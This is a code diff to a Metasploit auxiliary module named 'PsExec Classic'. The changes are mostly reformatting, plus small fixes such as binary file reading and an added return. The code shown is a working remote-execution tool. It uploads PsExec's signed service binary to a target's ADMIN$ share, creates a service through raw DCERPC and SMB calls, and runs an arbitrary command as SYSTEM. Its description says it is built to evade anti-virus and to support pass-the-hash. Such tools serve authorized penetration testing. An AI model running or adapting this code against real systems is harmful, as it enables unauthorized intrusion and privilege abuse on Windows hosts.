@@ -20,7 +20,11 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'PsExec Classic',
 			'Description'    => %q{
-					This module mimics the classic PsExec tool from Microsoft SysInternals. Anti-virus software has recently rendered the commonly-used exploit/windows/smb/psexec module much less useful because the uploaded executable stub is usually detected and deleted before it can be used.  This module sends the same code to the target as the authentic PsExec (which happens to have a digital signature from Microsoft), thus anti-virus software cannot distinguish the difference.  AV cannot block it without also blocking the authentic version.  Of course, this module also supports pass-the-hash, which the authentic PsExec does not.  You must provide a local path to the authentic PsExec.exe (via the PSEXEC_PATH option) so that the PSEXESVC.EXE service code can be extracted and uploaded to the target.  The specified command (via the COMMAND option) will be executed with SYSTEM privileges.
+					This module mimics the classic PsExec tool from Microsoft SysInternals. Anti-virus software has recently rendered the commonly-used exploit/windows/smb/psexec module much less useful
+					because the uploaded executable stub is usually detected and deleted before it can be used.  This module sends the same code to the target as the authentic PsExec
+					(which happens to have a digital signature from Microsoft), thus anti-virus software cannot distinguish the difference.  AV cannot block it without also blocking the authentic version.
+					Of course, this module also supports pass-the-hash, which the authentic PsExec does not.  You must provide a local path to the authentic PsExec.exe (via the PSEXEC_PATH option)
+					so that the PSEXESVC.EXE service code can be extracted and uploaded to the target.  The specified command (via the COMMAND option) will be executed with SYSTEM privileges.
 			},
 			'Author'         =>
 				[
@@ -57,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("File hash verified.  Extracting PSEXESVC.EXE code from #{psexec_path}...")
 
 		# Extract the PSEXESVC.EXE code from PsExec.exe.
-		hPsExec = File.open(datastore['PSEXEC_PATH'], 'r')
+		hPsExec = File.open(datastore['PSEXEC_PATH'], 'rb')
 		hPsExec.seek(193288)
 		psexesvc = hPsExec.read(181064)
 		hPsExec.close
@@ -82,7 +86,8 @@ class Metasploit3 < Msf::Auxiliary
 		simple.connect("\\\\#{datastore['RHOST']}\\ADMIN\$")
 
 		# Attempt to upload PSEXESVC.EXE into the ADMIN$ share.  If this
-		# fails, 
+		# fails, attempt to continue since it might already exist from
+		# a previous run.
 		begin
 			fd = smb_open('\\PSEXESVC.EXE', 'rwct')
 			fd << psexesvc
@@ -128,20 +133,19 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Error: #{e}")
 			return
 		end
-          
+
 		##
 		# CreateServiceW()
 		##
-          
+
 		svc_handle  = nil
 		svc_status  = nil
-          
+
 		print_status("Creating a new service (PSEXECSVC - \"PsExec\")...")
-		stubdata =
-            scm_handle +
+		stubdata = scm_handle +
 			NDR.wstring('PSEXESVC') +
 			NDR.uwstring('PsExec') +
-            
+
 			NDR.long(0x0F01FF) + # Access: MAX
 			NDR.long(0x00000010) + # Type: Own process
 			NDR.long(0x00000003) + # Start: Demand
@@ -164,7 +168,7 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Error: #{e}")
 			return
 		end
-          
+
 		##
 		# CloseHandle()
 		##
@@ -173,7 +177,7 @@ class Metasploit3 < Msf::Auxiliary
 			response = dcerpc.call(0x0, svc_handle)
 		rescue ::Exception
 		end
-          
+
 		##
 		# OpenServiceW
 		##
@@ -183,7 +187,7 @@ class Metasploit3 < Msf::Auxiliary
 				scm_handle +
 				NDR.wstring('PSEXESVC') +
 				NDR.long(0xF01FF)
-			
+
 			response = dcerpc.call(0x10, stubdata)
 			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 				svc_handle = dcerpc.last_response.stub_data[0,20]
@@ -209,7 +213,8 @@ class Metasploit3 < Msf::Auxiliary
 			print_error("Error: #{e}")
 			return
 		end
-          
+
+
 		print_status("Connecting to \\psexecsvc pipe...")
 		psexecsvc_proc = simple.create_pipe('\psexecsvc')
 
@@ -224,19 +229,26 @@ class Metasploit3 < Msf::Auxiliary
 		random_client_pid_low = rand(255)
 		random_client_pid_high = rand(255)
 		random_client_pid = (random_client_pid_low + (random_client_pid_high * 256)).to_s
-		
+
 		print_status("Instructing service to execute #{command}...")
 		smbclient = simple.client
-		
+
 		# The standard client.write() method doesn't work since the
 		# service is expecting certain packet flags to be set.  Hence,
 		# we need to use client.write_raw() and specify everything
 		# ourselves (such as Unicode strings, AndXOffsets, and data
 		# offsets).
-		
+
 		# In the first message, we tell the service our made-up
 		# hostname and PID, and tell it what program to execute.
-		smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14, 255, 0, 0, 0x000c, 19032, 0, 4292, 64, 0, 4293, "\xee\x58\x4a\x58\x4a\x00\x00" << random_client_pid_low.chr << random_client_pid_high.chr << "\x00\x00" + Rex::Text.to_unicode(random_hostname) << ("\x00" * 496) << Rex::Text.to_unicode(command) << ("\x00" * (3762 - (command.length * 2))), true)
+		smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14,
+			255, 0, 0, 0x000c, 19032, 0, 4292, 64, 0, 4293,
+			"\xee\x58\x4a\x58\x4a\x00\x00" <<
+			random_client_pid_low.chr <<
+			random_client_pid_high.chr << "\x00\x00" <<
+			Rex::Text.to_unicode(random_hostname) <<
+			("\x00" * 496) << Rex::Text.to_unicode(command) <<
+			("\x00" * (3762 - (command.length * 2))), true)
 
 		# In the next three messages, we just send lots of zero bytes...
 		smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14, 255, 57054, 4290, 0x0004, 19032, 0, 4290, 64, 0, 4291, "\xee" << ("\x00" * 4290), true)
@@ -248,9 +260,13 @@ class Metasploit3 < Msf::Auxiliary
 		# In the final message, we give it some magic bytes.  This
 		# (somehow) corresponds to the "-s" flag in PsExec.exe, which
 		# tells it to execute the specified command as SYSTEM.
-		smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14, 255, 57054, 17160, 0x0004, 19032, 0, 1872, 64, 0, 1873, "\xee" << ("\x00" * 793) << "\x01" << ("\x00" * 14) << "\xff\xff\xff\xff" << ("\x00" * 1048) << "\x01" << ("\x00" * 11), true)
+		smbclient.write_raw(psexecsvc_proc.file_id, 0x18, 0xc807, 14,
+			255, 57054, 17160, 0x0004, 19032, 0, 1872, 64, 0, 1873,
+			"\xee" << ("\x00" * 793) << "\x01" << ("\x00" * 14) <<
+			"\xff\xff\xff\xff" << ("\x00" * 1048) << "\x01" <<
+			("\x00" * 11), true)
 
-          
+
 		# Connect to the named pipes that correspond to stdin, stdout,
 		# and stderr.
 		psexecsvc_proc_stdin = connect_to_pipe("\psexecsvc-#{random_hostname}-#{random_client_pid}-stdin")
@@ -339,7 +355,7 @@ class Metasploit3 < Msf::Auxiliary
 					if data == "\x0a" and last_char != "\x0d"
 						smbclient.write_raw(psexecsvc_proc_stdin.file_id, 0x18, 0xc807, 14, 255, 57054, 0, 0x0008, 1, 0, 1, 64, 0, 2, "\xee\x0d", true)
 					end
-					
+
 					smbclient.write_raw(psexecsvc_proc_stdin.file_id, 0x18, 0xc807, 14, 255, 57054, 0, 0x0008, 1, 0, 1, 64, 0, 2, "\xee" << data, true)
 					last_char = data
 				end
@@ -382,7 +398,7 @@ class Metasploit3 < Msf::Auxiliary
 		rescue ::Exception => e
 			print_error("Error: #{e}")
 		end
-          
+
 		##
 		# CloseHandle()
 		##
@@ -419,7 +435,7 @@ class Metasploit3 < Msf::Auxiliary
 			# On the first retry, wait one second, on the second
 			# retry, wait two...
 			select(nil, nil, nil, retries)
-			
+
 			begin
 				pipe_fd = simple.create_pipe(pipe_name)
 			rescue
@@ -452,6 +468,7 @@ class Metasploit3 < Msf::Auxiliary
 				response = dcerpc.call(0x06, svc_handle)
 			rescue ::Exception => e
 				print_error("Error: #{e}")
+				return false
 			end
 
 			# This byte string signifies that the service is
